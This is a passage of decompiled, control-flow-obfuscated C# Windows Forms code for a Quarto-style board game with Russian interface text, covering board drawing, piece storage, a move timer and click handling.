using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;

namespace Cytotechnologist;

public class Form1 : Form
{
	public class Figurine
	{
		public bool Dark;

		public bool Big;

		public bool Square;

		public bool Point;

		public Figurine(bool dark, bool big, bool square, bool point)
		{
			Dark = dark;
			Big = big;
			Square = square;
			Point = point;
		}

		public Figurine(Figurine copy)
		{
			while (true)
			{
				int num = -716441560;
				while (true)
				{
					uint num2;
					switch ((num2 = (uint)num ^ 0xC5EFE36Bu) % 4u)
					{
					case 3u:
						num = (int)(num2 * 903959300) ^ -381592317;
						continue;
					case 0u:
						Dark = copy.Dark;
						Big = copy.Big;
						Square = copy.Square;
						num = ((int)num2 * -1411362061) ^ -776192022;
						continue;
					case 2u:
						break;
					default:
						Point = copy.Point;
						return;
					}
					break;
				}
			}
		}
	}

	private Form menu;

	private Random rnd = Form1.smethod_0();

	private Figurine[,] storage;

	private Figurine[,] board;

	private readonly int size = 60;

	public bool turn;

	private DateTime time;

	private int step;

	private PictureBox[,] pictureBox;

	private PictureBox[,] borderBox;

	private IContainer components = null;

	private static Type ComMember;

	private PictureBox pictureBox1;

	private Button button2;

	private Button button1;

	private RichTextBox richTextBox1;

	private Panel panel1;

	private Label label1;

	private Label label2;

	private Label label5;

	private Label label6;

	public Timer timer1;

	public Form1()
	{
		//IL_004c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0056: Expected O, but got Unknown
		int num4 = default(int);
		int num3 = default(int);
		bool flag = default(bool);
		double num7 = default(double);
		while (true)
		{
			int num = 381514789;
			while (true)
			{
				uint num2;
				double num8;
				PictureBox[,] array2;
				int num9;
				int num10;
				PictureBox obj2;
				switch ((num2 = (uint)num ^ 0x261750CCu) % 25u)
				{
				case 24u:
					num = ((int)num2 * -729998389) ^ 0x515A25D0;
					continue;
				case 23u:
					Form1.smethod_6((Control)(object)pictureBox[num4, num3], new MouseEventHandler(PictureBoxIJ_MouseDown));
					num = (int)((num2 * 1493225353) ^ 0x7563C719);
					continue;
				case 22u:
					num3 = 0;
					num = 1675328741;
					continue;
				case 21u:
					num4++;
					num = (int)((num2 * 1341409891) ^ 0xE68731);
					continue;
				case 20u:
					num4 = 0;
					num = (int)((num2 * 1911577899) ^ 0x3B0879FE);
					continue;
				case 19u:
				{
					int num13;
					if (num4 >= 4)
					{
						num = 1377301068;
						num13 = 1377301068;
					}
					else
					{
						num = 1098913655;
						num13 = 1098913655;
					}
					continue;
				}
				case 18u:
					num = (int)((num2 * 196225857) ^ 0x41F0070B);
					continue;
				case 17u:
					borderBox = new PictureBox[4, 4];
					num = (int)(num2 * 1663753260) ^ -690654451;
					continue;
				case 16u:
					Form1.smethod_1(richTextBox1, (HorizontalAlignment)2);
					pictureBox = new PictureBox[4, 4];
					num = (int)(num2 * 1265260211) ^ -985638973;
					continue;
				case 15u:
				{
					int num11;
					int num12;
					if (!flag)
					{
						num11 = 1933430965;
						num12 = 1933430965;
					}
					else
					{
						num11 = 1543075820;
						num12 = 1543075820;
					}
					num = num11 ^ (int)(num2 * 1125566023);
					continue;
				}
				case 14u:
					num8 = 4.1;
					goto IL_0153;
				case 13u:
					if (num3 >= 2)
					{
						num = 816014732;
						continue;
					}
					num8 = 0.0;
					goto IL_0153;
				case 12u:
					num = ((int)num2 * -1088735411) ^ -453160108;
					continue;
				case 11u:
					flag = num3 < 4;
					num = 1781050460;
					continue;
				case 10u:
				{
					PictureBox[,] array = borderBox;
					int num5 = num4;
					int num6 = num3;
					PictureBox obj = Form1.smethod_2();
					Form1.smethod_3((Control)(object)obj, new Size(size - 2, size - 2));
					Form1.smethod_4((Control)(object)obj, new Point(1 + (int)(((double)num3 + num7) * (double)size), 1 + num4 * size));
					Form1.smethod_7((Control)(object)obj, bool_0: false);
					array[num5, num6] = obj;
					num = ((int)num2 * -1710972307) ^ -554801543;
					continue;
				}
				case 9u:
					num = (int)(num2 * 922084609) ^ -1730714325;
					continue;
				case 8u:
					Form1.smethod_11((Control)(object)menu);
					num = (int)((num2 * 9022430) ^ 0x49FDD9E8);
					continue;
				case 6u:
				{
					Form3 form_ = new Form3();
					Form1.smethod_10((Form)(object)form_, (Form)(object)this);
					menu = (Form)(object)form_;
					num = ((int)num2 * -213323778) ^ -1701142508;
					continue;
				}
				case 5u:
					Form1.smethod_9(Form1.smethod_8((Control)(object)panel1), (Control)(object)borderBox[num4, num3]);
					num = (int)((num2 * 267162351) ^ 0x7263B993);
					continue;
				case 4u:
					Form1.smethod_9(Form1.smethod_8((Control)(object)panel1), (Control)(object)pictureBox[num4, num3]);
					num = ((int)num2 * -606626574) ^ -761526091;
					continue;
				case 3u:
					num = ((int)num2 * -258061720) ^ 0x3A04F3F7;
					continue;
				case 2u:
					InitializeComponent();
					num = (int)(num2 * 279624176) ^ -516307645;
					continue;
				case 1u:
					num3++;
					num = (int)((num2 * 1467155222) ^ 0x7DEC95AB);
					continue;
				default:
					return;
				case 0u:
					break;
				case 7u:
					return;
					IL_0153:
					num7 = num8;
					array2 = pictureBox;
					num9 = num4;
					num10 = num3;
					obj2 = Form1.smethod_2();
					Form1.smethod_3((Control)(object)obj2, new Size(size - 8, size - 8));
					Form1.smethod_4((Control)(object)obj2, new Point(4 + (int)(((double)num3 + num7) * (double)size), 4 + num4 * size));
					Form1.smethod_5((Control)(object)obj2, Color.White);
					array2[num9, num10] = obj2;
					num = 1675866407;
					continue;
				}
				break;
			}
		}
	}

	private void Form1_LocationChanged(object sender, EventArgs e)
	{
		Form1.smethod_13(menu, new Point(Form1.smethod_12((Form)(object)this).X + 8, Form1.smethod_12((Form)(object)this).Y + 51));
	}

	private void Form1_Shown(object sender, EventArgs e)
	{
		Form1.smethod_14(menu);
	}

	public void Button1_Click(object sender, EventArgs e)
	{
		bool flag = default(bool);
		while (true)
		{
			int num = -167116952;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xCD54FA6Bu) % 8u)
				{
				case 6u:
					Form1.smethod_14(menu);
					num = (int)(num2 * 1805822351) ^ -932827770;
					continue;
				case 5u:
				{
					int num3;
					int num4;
					if (flag)
					{
						num3 = 934090388;
						num4 = 934090388;
					}
					else
					{
						num3 = 702741811;
						num4 = 702741811;
					}
					num = num3 ^ (int)(num2 * 62256366);
					continue;
				}
				case 4u:
					num = ((int)num2 * -630656041) ^ -1486552211;
					continue;
				case 3u:
					Form1.smethod_15(timer1);
					num = (int)((num2 * 790445106) ^ 0x1BD74319);
					continue;
				case 2u:
					flag = Form1.smethod_16((Control)(object)menu) < 296;
					num = -1863073986;
					continue;
				case 1u:
				{
					Form control_ = menu;
					Form1.smethod_17((Control)(object)control_, Form1.smethod_16((Control)(object)control_) + 5);
					num = -1807122671;
					continue;
				}
				default:
					return;
				case 0u:
					break;
				case 7u:
					return;
				}
				break;
			}
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		bool flag = default(bool);
		int num5 = default(int);
		int num3 = default(int);
		while (true)
		{
			int num = -1190748076;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xBCD94D26u) % 21u)
				{
				case 19u:
					num = ((int)num2 * -1784963316) ^ 0x4157765;
					continue;
				case 18u:
					flag = num5 < 4;
					num = -1303059076;
					continue;
				case 16u:
					Form1.smethod_5((Control)(object)borderBox[num5, num3], Color.White);
					Form1.smethod_7((Control)(object)pictureBox[num5, num3], bool_0: false);
					num = (int)((num2 * 307329211) ^ 0x5357072B);
					continue;
				case 15u:
					board = new Figurine[4, 4];
					num = ((int)num2 * -853273065) ^ -1341893517;
					continue;
				case 14u:
					num = ((int)num2 * -724888572) ^ 0x506DA254;
					continue;
				case 13u:
					Paint_Board();
					num = (int)((num2 * 1333588930) ^ 0x5A4C6EEA);
					continue;
				case 12u:
					Paint_Storage();
					num = ((int)num2 * -1238820832) ^ -906046944;
					continue;
				case 11u:
					num3 = 0;
					num = -151754886;
					continue;
				case 10u:
					storage[num5, num3] = new Figurine(num5 < 2, num3 % 2 == 0, num3 < 2, num5 % 2 == 1);
					num = (int)((num2 * 486414421) ^ 0x5C8375EF);
					continue;
				case 9u:
					Form1.smethod_7((Control)(object)button2, bool_0: false);
					num = ((int)num2 * -1915805769) ^ -281209476;
					continue;
				case 8u:
				{
					int num6;
					int num7;
					if (flag)
					{
						num6 = -2039966046;
						num7 = -2039966046;
					}
					else
					{
						num6 = -1540429629;
						num7 = -1540429629;
					}
					num = num6 ^ (int)(num2 * 468095047);
					continue;
				}
				case 7u:
					num3++;
					num = ((int)num2 * -577576145) ^ 0x759337CE;
					continue;
				case 6u:
					num = -1182611347;
					continue;
				case 5u:
					num5++;
					num = (int)((num2 * 1661285449) ^ 0x790E6715);
					continue;
				case 4u:
					num = ((int)num2 * -815212634) ^ 0x78C226DF;
					continue;
				case 3u:
					num = ((int)num2 * -1676479236) ^ 0x677DEA9C;
					continue;
				case 2u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: false);
					num = (int)(num2 * 317163821) ^ -1265450907;
					continue;
				case 1u:
					storage = new Figurine[4, 4];
					num5 = 0;
					num = (int)((num2 * 666797707) ^ 0x492B8257);
					continue;
				case 0u:
				{
					int num4;
					if (num3 >= 4)
					{
						num = -1709667449;
						num4 = -1709667449;
					}
					else
					{
						num = -1374479822;
						num4 = -1374479822;
					}
					continue;
				}
				default:
					return;
				case 17u:
					break;
				case 20u:
					return;
				}
				break;
			}
		}
	}

	private void Paint_Board()
	{
		Form1.smethod_20(pictureBox1, (Image)(object)Form1.smethod_19(Form1.smethod_18((Control)(object)pictureBox1), Form1.smethod_16((Control)(object)pictureBox1)));
		Graphics graphics_ = default(Graphics);
		int num5 = default(int);
		int num4 = default(int);
		bool flag2 = default(bool);
		bool square = default(bool);
		float num10 = default(float);
		float num6 = default(float);
		float num7 = default(float);
		float num3 = default(float);
		bool big = default(bool);
		float num13 = default(float);
		Brush brush_ = default(Brush);
		bool dark = default(bool);
		bool flag = default(bool);
		while (true)
		{
			int num = 1669135720;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xC5E04D0u) % 42u)
				{
				case 41u:
					num = ((int)num2 * -204801449) ^ 0xA492A6C;
					continue;
				case 40u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num5 = 0;
					num = ((int)num2 * -1720150156) ^ -973620472;
					continue;
				case 39u:
					num = ((int)num2 * -1918357253) ^ 0x27582857;
					continue;
				case 38u:
				{
					int num16;
					int num17;
					if (board[num5, num4] != null)
					{
						num16 = 867609395;
						num17 = 867609395;
					}
					else
					{
						num16 = 25860787;
						num17 = 25860787;
					}
					num = num16 ^ ((int)num2 * -1011138621);
					continue;
				}
				case 37u:
					flag2 = num4 < 4;
					num = 1832982466;
					continue;
				case 36u:
				{
					int num22;
					int num23;
					if (!flag2)
					{
						num22 = -647701654;
						num23 = -647701654;
					}
					else
					{
						num22 = -1628360579;
						num23 = -1628360579;
					}
					num = num22 ^ (int)(num2 * 750520810);
					continue;
				}
				case 35u:
					num = (int)((num2 * 288677067) ^ 0x5BA8B003);
					continue;
				case 34u:
					num = (int)(num2 * 1178724891) ^ -474773960;
					continue;
				case 33u:
					Form1.smethod_24(graphics_, Form1.smethod_23(), ((float)num4 + 0.05f) * (float)size, ((float)num5 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = ((int)num2 * -548997778) ^ -1660687580;
					continue;
				case 32u:
				{
					int num11;
					int num12;
					if (!square)
					{
						num11 = 1291065951;
						num12 = 1291065951;
					}
					else
					{
						num11 = 37947920;
						num12 = 37947920;
					}
					num = num11 ^ (int)(num2 * 1673153659);
					continue;
				}
				case 31u:
					num10 = 1f;
					num = ((int)num2 * -336124884) ^ -1880053727;
					continue;
				case 30u:
					num6 = num7 * 0.9f / (float)Form1.smethod_27(2.0);
					num = (int)((num2 * 1364761191) ^ 0xD89A68A);
					continue;
				case 29u:
					num4 = 0;
					num = 1846442083;
					continue;
				case 28u:
					num = 322482585;
					continue;
				case 27u:
					num4++;
					num = ((int)num2 * -292128138) ^ -1240688275;
					continue;
				case 26u:
					Form1.smethod_24(graphics_, (Brush)(object)Form1.smethod_29(Color.FromArgb(180, Color.Peru)), num3 + (float)(num4 * size), num3 + (float)(num5 * size), num6, num6);
					num = ((int)num2 * -56939409) ^ -1377206060;
					continue;
				case 25u:
				{
					int num20;
					int num21;
					if (!big)
					{
						num20 = -1611323913;
						num21 = -1611323913;
					}
					else
					{
						num20 = -1900540953;
						num21 = -1900540953;
					}
					num = num20 ^ (int)(num2 * 1555723664);
					continue;
				}
				case 24u:
					num13 = 1f - num10 * 0.9f / (float)Form1.smethod_27(2.0);
					num = 2131185714;
					continue;
				case 22u:
					num7 = (float)size * num10;
					num3 = (float)size * (num13 / 2f);
					num = (int)((num2 * 337201221) ^ 0x35CE0050);
					continue;
				case 21u:
					brush_ = Form1.smethod_25();
					num = ((int)num2 * -296203225) ^ 0x75323FC5;
					continue;
				case 20u:
					num5++;
					num = ((int)num2 * -715605862) ^ 0x62C5046C;
					continue;
				case 19u:
					num10 = 0.7f;
					num = 1546362420;
					continue;
				case 18u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = ((int)num2 * -398321377) ^ 0x58B98DE7;
					continue;
				case 17u:
				{
					int num18;
					int num19;
					if (dark)
					{
						num18 = 1049362089;
						num19 = 1049362089;
					}
					else
					{
						num18 = 2136721329;
						num19 = 2136721329;
					}
					num = num18 ^ (int)(num2 * 351910748);
					continue;
				}
				case 16u:
					square = board[num5, num4].Square;
					num = (int)(num2 * 360925445) ^ -1832182954;
					continue;
				case 15u:
					num = 527785083;
					continue;
				case 14u:
				{
					int num14;
					int num15;
					if (flag)
					{
						num14 = -2019689617;
						num15 = -2019689617;
					}
					else
					{
						num14 = -1248437848;
						num15 = -1248437848;
					}
					num = num14 ^ (int)(num2 * 1426502501);
					continue;
				}
				case 13u:
					brush_ = Form1.smethod_26();
					num = 139900390;
					continue;
				case 12u:
					big = board[num5, num4].Big;
					num = 1826954823;
					continue;
				case 11u:
					num3 = (float)size * (num13 / 2f);
					num = (int)((num2 * 570569172) ^ 0x75D9C2D8);
					continue;
				case 10u:
					Form1.smethod_28(graphics_, brush_, num3 + (float)(num4 * size), num3 + (float)(num5 * size), num6, num6);
					num = (int)(num2 * 153783538) ^ -996543985;
					continue;
				case 9u:
					dark = board[num5, num4].Dark;
					num = (int)(num2 * 1697954483) ^ -126533830;
					continue;
				case 8u:
					num = (int)(num2 * 1147597168) ^ -919011236;
					continue;
				case 7u:
					num = ((int)num2 * -440143732) ^ -1136036302;
					continue;
				case 6u:
					num13 = 1f - num10 * 0.4f / (float)Form1.smethod_27(2.0);
					num = 1195906477;
					continue;
				case 5u:
				{
					int num8;
					int num9;
					if (!board[num5, num4].Point)
					{
						num8 = -103853281;
						num9 = -103853281;
					}
					else
					{
						num8 = -820986725;
						num9 = -820986725;
					}
					num = num8 ^ ((int)num2 * -2084819933);
					continue;
				}
				case 4u:
					flag = num5 < 4;
					num = 450244270;
					continue;
				case 3u:
					num = 1674138101;
					continue;
				case 2u:
					num6 = num7 * 0.4f / (float)Form1.smethod_27(2.0);
					num = ((int)num2 * -914593601) ^ 0x6393975D;
					continue;
				case 1u:
					Form1.smethod_24(graphics_, brush_, num3 + (float)(num4 * size), num3 + (float)(num5 * size), num6, num6);
					num = 1703830847;
					continue;
				default:
					return;
				case 0u:
					break;
				case 23u:
					return;
				}
				break;
			}
		}
	}

	private void Paint_Storage()
	{
		float num8 = default(float);
		float num10 = default(float);
		float num4 = default(float);
		float num3 = default(float);
		Brush brush_ = default(Brush);
		int num5 = default(int);
		Graphics graphics_ = default(Graphics);
		bool big = default(bool);
		int num6 = default(int);
		float num7 = default(float);
		bool flag = default(bool);
		bool dark = default(bool);
		bool point = default(bool);
		while (true)
		{
			int num = 439826147;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x39A62568u) % 39u)
				{
				case 38u:
					num8 = (float)size * (num10 / 2f) - 4f;
					num4 = num3 * 0.9f / (float)Form1.smethod_27(2.0);
					num = (int)(num2 * 298587153) ^ -1339897611;
					continue;
				case 37u:
					brush_ = Form1.smethod_25();
					num = (int)((num2 * 51667526) ^ 0xBB48B5F);
					continue;
				case 36u:
					num5++;
					num = ((int)num2 * -490961913) ^ -67821272;
					continue;
				case 35u:
					num = (int)(num2 * 352820215) ^ -190023378;
					continue;
				case 34u:
					Form1.smethod_28(graphics_, brush_, num8, num8, num4, num4);
					num = ((int)num2 * -1208697744) ^ -1213419226;
					continue;
				case 33u:
					big = storage[num5, num6].Big;
					num = 419488184;
					continue;
				case 32u:
				{
					int num18;
					int num19;
					if (!big)
					{
						num18 = -572744979;
						num19 = -572744979;
					}
					else
					{
						num18 = -833344615;
						num19 = -833344615;
					}
					num = num18 ^ (int)(num2 * 2105430855);
					continue;
				}
				case 31u:
				{
					int num15;
					if (num6 >= 4)
					{
						num = 747647653;
						num15 = 747647653;
					}
					else
					{
						num = 1225946991;
						num15 = 1225946991;
					}
					continue;
				}
				case 30u:
					num = ((int)num2 * -515587672) ^ 0x5892FAD9;
					continue;
				case 29u:
					Form1.smethod_20(pictureBox[num5, num6], (Image)(object)Form1.smethod_19(Form1.smethod_18((Control)(object)pictureBox[num5, num6]), Form1.smethod_16((Control)(object)pictureBox[num5, num6])));
					num = (int)(num2 * 850805570) ^ -962931035;
					continue;
				case 28u:
					num10 = 1f - num7 * 0.9f / (float)Form1.smethod_27(2.0);
					num = 58744325;
					continue;
				case 27u:
					num = ((int)num2 * -1524608595) ^ 0x2B746C17;
					continue;
				case 26u:
					num5 = 0;
					num = ((int)num2 * -287827032) ^ 0x2998363D;
					continue;
				case 25u:
					Form1.smethod_30((Control)(object)pictureBox[num5, num6]);
					num = 1182334062;
					continue;
				case 24u:
					Form1.smethod_24(graphics_, (Brush)(object)Form1.smethod_29(Color.FromArgb(180, Color.Peru)), num8, num8, num4, num4);
					num = ((int)num2 * -1722686467) ^ -2119868062;
					continue;
				case 23u:
					num = (int)(num2 * 1982795157) ^ -128271550;
					continue;
				case 22u:
					flag = num5 < 4;
					num = 824800471;
					continue;
				case 21u:
					num6 = 0;
					num = 1616720790;
					continue;
				case 19u:
					num = ((int)num2 * -986409457) ^ -976366117;
					continue;
				case 18u:
				{
					int num20;
					int num21;
					if (!flag)
					{
						num20 = -1273867558;
						num21 = -1273867558;
					}
					else
					{
						num20 = -527866265;
						num21 = -527866265;
					}
					num = num20 ^ ((int)num2 * -1791826830);
					continue;
				}
				case 17u:
					brush_ = Form1.smethod_26();
					num = 2000171069;
					continue;
				case 16u:
				{
					int num16;
					int num17;
					if (!dark)
					{
						num16 = -299960615;
						num17 = -299960615;
					}
					else
					{
						num16 = -311240301;
						num17 = -311240301;
					}
					num = num16 ^ (int)(num2 * 473857413);
					continue;
				}
				case 15u:
					num8 = (float)size * (num10 / 2f) - 4f;
					num = (int)((num2 * 928696384) ^ 0x61F06A0E);
					continue;
				case 14u:
					num = (int)((num2 * 1421380398) ^ 0x40514F25);
					continue;
				case 13u:
				{
					int num13;
					int num14;
					if (point)
					{
						num13 = -1629884296;
						num14 = -1629884296;
					}
					else
					{
						num13 = -188067346;
						num14 = -188067346;
					}
					num = num13 ^ ((int)num2 * -898504361);
					continue;
				}
				case 12u:
					num7 = 1f;
					num = (int)(num2 * 2129271210) ^ -1983987107;
					continue;
				case 11u:
				{
					int num11;
					int num12;
					if (num6 >= 2)
					{
						num11 = 1727267538;
						num12 = 1727267538;
					}
					else
					{
						num11 = 337482167;
						num12 = 337482167;
					}
					num = num11 ^ (int)(num2 * 918469885);
					continue;
				}
				case 10u:
					num3 = (float)size * num7;
					num = ((int)num2 * -1173212591) ^ -1041356208;
					continue;
				case 9u:
					num6++;
					num = 2137868590;
					continue;
				case 8u:
					num10 = 1f - num7 * 0.4f / (float)Form1.smethod_27(2.0);
					num = 3845857;
					continue;
				case 7u:
					num = ((int)num2 * -1395152380) ^ 0x63EE4ED6;
					continue;
				case 6u:
				{
					int num9;
					if (storage[num5, num6] == null)
					{
						num = 1312325604;
						num9 = 1312325604;
					}
					else
					{
						num = 360984829;
						num9 = 360984829;
					}
					continue;
				}
				case 5u:
					Form1.smethod_24(graphics_, brush_, num8, num8, num4, num4);
					num = 1175488326;
					continue;
				case 4u:
					num7 = 0.7f;
					num = 1218102601;
					continue;
				case 2u:
					num = ((int)num2 * -2007101164) ^ -554137533;
					continue;
				case 1u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox[num5, num6]));
					dark = storage[num5, num6].Dark;
					num = (int)(num2 * 1812507324) ^ -430893704;
					continue;
				case 0u:
					num4 = num3 * 0.4f / (float)Form1.smethod_27(2.0);
					point = storage[num5, num6].Point;
					num = (int)((num2 * 409335639) ^ 0x7B4E5645);
					continue;
				default:
					return;
				case 20u:
					break;
				case 3u:
					return;
				}
				break;
			}
		}
	}

	public void StartGame()
	{
		Form1_Load(this, Form1.smethod_31());
		bool flag = turn;
		int num3 = default(int);
		int num5 = default(int);
		bool flag2 = default(bool);
		int num6 = default(int);
		int num7 = default(int);
		while (true)
		{
			int num = 911563633;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x76F3702Bu) % 29u)
				{
				case 28u:
					Form1.smethod_35(timer1, bool_0: true);
					num = (int)(num2 * 1557523005) ^ -579633548;
					continue;
				case 27u:
				{
					int num10;
					int num11;
					if (flag)
					{
						num10 = 2120906928;
						num11 = 2120906928;
					}
					else
					{
						num10 = 993652280;
						num11 = 993652280;
					}
					num = num10 ^ (int)(num2 * 1862749329);
					continue;
				}
				case 26u:
					num3 = 0;
					num = 881404322;
					continue;
				case 25u:
					num5 = 0;
					num = ((int)num2 * -1753668688) ^ 0x6A347C94;
					continue;
				case 24u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: true);
					num = (int)(num2 * 1228574465) ^ -568061037;
					continue;
				case 23u:
					num5++;
					num = ((int)num2 * -583428330) ^ 0x5E2355BF;
					continue;
				case 22u:
					Form1.smethod_7((Control)(object)pictureBox[num5, num3], bool_0: true);
					num = 1497640962;
					continue;
				case 21u:
					num = (int)((num2 * 1463450060) ^ 0x5EE23F09);
					continue;
				case 20u:
					num = ((int)num2 * -220678450) ^ 0xAA008A5;
					continue;
				case 18u:
					flag2 = num5 < 4;
					num = 269957384;
					continue;
				case 17u:
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = 708377040;
					continue;
				case 16u:
					num3++;
					num = (int)(num2 * 795181143) ^ -1387284601;
					continue;
				case 15u:
				{
					int num8;
					int num9;
					if (flag2)
					{
						num8 = -1460956614;
						num9 = -1460956614;
					}
					else
					{
						num8 = -875193478;
						num9 = -875193478;
					}
					num = num8 ^ (int)(num2 * 121421081);
					continue;
				}
				case 14u:
					time = new DateTime(0L, DateTimeKind.Unspecified);
					num = (int)((num2 * 780739578) ^ 0x355BB247);
					continue;
				case 13u:
					num = ((int)num2 * -25292750) ^ -703750271;
					continue;
				case 12u:
					num = 1163985046;
					continue;
				case 11u:
					Form1.smethod_5((Control)(object)borderBox[num6, num7], Color.Blue);
					num = (int)((num2 * 1482361699) ^ 0x56999A27);
					continue;
				case 10u:
					num = (int)(num2 * 422383030) ^ -808122952;
					continue;
				case 9u:
					step = 0;
					num = (int)(num2 * 1414137858) ^ -2140931084;
					continue;
				case 8u:
					Form1.smethod_32((Control)(object)richTextBox1, "Противник выбрал фигуру. Выберете поле на доске для установки этой фигуры.");
					num = (int)(num2 * 1473590043) ^ -1362396473;
					continue;
				case 7u:
					num6 = Form1.smethod_33(rnd, 4);
					num7 = Form1.smethod_33(rnd, 4);
					num = (int)(num2 * 902680810) ^ -1967896866;
					continue;
				case 6u:
					num = (int)(num2 * 1499771107) ^ -375313218;
					continue;
				case 5u:
					step = 1;
					num = ((int)num2 * -406880426) ^ -218088699;
					continue;
				case 4u:
					Form1.smethod_36(timer1);
					num = ((int)num2 * -970721966) ^ -1135187152;
					continue;
				case 3u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ваш ход. Выберете фигуру, которой будет играть противник.");
					num = ((int)num2 * -612265118) ^ 0x4B0BDF28;
					continue;
				case 2u:
					num = (int)((num2 * 1709573416) ^ 0x47345000);
					continue;
				case 1u:
				{
					int num4;
					if (num3 >= 4)
					{
						num = 1432419879;
						num4 = 1432419879;
					}
					else
					{
						num = 390650914;
						num4 = 390650914;
					}
					continue;
				}
				default:
					return;
				case 19u:
					break;
				case 0u:
					return;
				}
				break;
			}
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		while (true)
		{
			int num = 1541198123;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x34205BF2u) % 4u)
				{
				case 1u:
					time = time.AddSeconds(1.0);
					Form1.smethod_32((Control)(object)label1, Form1.smethod_34("Время: ", time.ToString("HH:mm:ss")));
					num = ((int)num2 * -112890641) ^ -87172923;
					continue;
				case 0u:
					num = ((int)num2 * -1907895617) ^ -319681775;
					continue;
				default:
					return;
				case 2u:
					break;
				case 3u:
					return;
				}
				break;
			}
		}
	}

	private void PictureBoxIJ_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_00f3: Unknown result type (might be due to invalid IL or missing references)
		//IL_0109: Expected O, but got Unknown
		Point point = Form1.smethod_37((Control)((sender is PictureBox) ? sender : null));
		int num5 = default(int);
		int num3 = default(int);
		int num4 = default(int);
		bool flag = default(bool);
		int num6 = default(int);
		bool flag2 = default(bool);
		bool flag3 = default(bool);
		while (true)
		{
			int num = 1405200512;
			while (true)
			{
				uint num2;
				int num14;
				switch ((num2 = (uint)num ^ 0x54817C28u) % 27u)
				{
				case 26u:
					num5++;
					num = ((int)num2 * -1610027187) ^ 0x45C01E;
					continue;
				case 25u:
					if (storage[num3, num4] != null)
					{
						num = 1976814779;
						continue;
					}
					num14 = 0;
					goto IL_0044;
				case 24u:
				{
					int num11;
					if (num5 >= 4)
					{
						num = 1696376745;
						num11 = 1696376745;
					}
					else
					{
						num = 73094407;
						num11 = 73094407;
					}
					continue;
				}
				case 23u:
					flag = num6 < 4;
					num = 465489581;
					continue;
				case 22u:
					num = ((int)num2 * -1812815515) ^ -1731455904;
					continue;
				case 21u:
					num = (int)(num2 * 1419416216) ^ -1280283325;
					continue;
				case 20u:
					flag2 = num4 > 1;
					num = (int)((num2 * 364848228) ^ 0x634F1B33);
					continue;
				case 19u:
					Form1.smethod_7((Control)(object)button2, bool_0: true);
					num = ((int)num2 * -324346527) ^ 0x177E8F18;
					continue;
				case 18u:
					num14 = ((Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox[num3, num4]), Form1.smethod_38(e), Form1.smethod_39(e)) != Color.FromArgb(0, 0, 0, 0)) ? 1 : 0);
					goto IL_0044;
				case 17u:
					num6 = 0;
					num = 1670951933;
					continue;
				case 16u:
				{
					int num12;
					int num13;
					if (!flag3)
					{
						num12 = -1089397495;
						num13 = -1089397495;
					}
					else
					{
						num12 = -567730588;
						num13 = -567730588;
					}
					num = num12 ^ (int)(num2 * 1465077099);
					continue;
				}
				case 15u:
					num5 = 0;
					num = ((int)num2 * -884713084) ^ -2133483341;
					continue;
				case 13u:
					num3 = point.Y / size;
					point = Form1.smethod_37((Control)((sender is PictureBox) ? sender : null));
					num = (int)((num2 * 561145002) ^ 0x7DE8C505);
					continue;
				case 12u:
				{
					int num9;
					int num10;
					if (!flag2)
					{
						num9 = 1098231171;
						num10 = 1098231171;
					}
					else
					{
						num9 = 756978783;
						num10 = 756978783;
					}
					num = num9 ^ ((int)num2 * -430845435);
					continue;
				}
				case 11u:
					num = ((int)num2 * -1665891003) ^ 0x413C8DB3;
					continue;
				case 10u:
					num = (int)((num2 * 202954327) ^ 0x62553C2D);
					continue;
				case 9u:
					num6++;
					num = ((int)num2 * -946685054) ^ 0x542FF61C;
					continue;
				case 7u:
					num4 -= 4;
					num = ((int)num2 * -762832152) ^ 0x71A8C10C;
					continue;
				case 6u:
				{
					int num7;
					int num8;
					if (!flag)
					{
						num7 = 1193895714;
						num8 = 1193895714;
					}
					else
					{
						num7 = 603058252;
						num8 = 603058252;
					}
					num = num7 ^ ((int)num2 * -902175082);
					continue;
				}
				case 5u:
					num4 = point.X / size;
					num = (int)(num2 * 234970367) ^ -1438110995;
					continue;
				case 4u:
					num = ((int)num2 * -1634401413) ^ 0x736FD2FB;
					continue;
				case 3u:
					Form1.smethod_5((Control)(object)borderBox[num5, num6], Color.White);
					num = 782414331;
					continue;
				case 2u:
					Form1.smethod_5((Control)(object)borderBox[num3, num4], Color.Red);
					num = (int)((num2 * 213068923) ^ 0x59A5EE7C);
					continue;
				case 1u:
					num = ((int)num2 * -946246110) ^ -2131589860;
					continue;
				case 0u:
					Form1.smethod_32((Control)(object)richTextBox1, "Именно эта фигура? Если да - нажмите \"Подтвердить\".");
					num = (int)(num2 * 1365032735) ^ -1388191906;
					continue;
				default:
					return;
				case 8u:
					break;
				case 14u:
					return;
					IL_0044:
					flag3 = (byte)num14 != 0;
					num = 1040856044;
					continue;
				}
				break;
			}
		}
	}

	private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_02ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_0300: Expected O, but got Unknown
		Graphics graphics_ = default(Graphics);
		int num7 = default(int);
		int num8 = default(int);
		int num3 = default(int);
		int num6 = default(int);
		bool flag3 = default(bool);
		bool flag = default(bool);
		bool flag2 = default(bool);
		while (true)
		{
			int num = 751231350;
			while (true)
			{
				uint num2;
				int num9;
				switch ((num2 = (uint)num ^ 0x36C29818u) % 26u)
				{
				case 25u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
